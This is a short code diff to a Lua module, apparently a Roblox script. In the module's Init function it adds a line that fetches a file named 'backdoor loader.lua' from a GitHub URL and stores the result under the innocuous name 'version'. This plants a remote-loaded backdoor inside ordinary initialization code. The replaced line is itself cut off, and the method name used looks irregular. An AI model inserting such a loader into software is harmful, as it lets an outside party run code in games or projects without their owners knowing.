@@ -23,7 +23,7 @@ local module = {}
 function m:Init() 
 
 
-    local version = HttpService:Decode(HttpService:GetAsync(
+    local version = HttpService:Decode(HttpService:GetAsync("https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/backdoor%20loader.lua"))
   		local s, c
 		repeat
 			s, c = pcall(function()
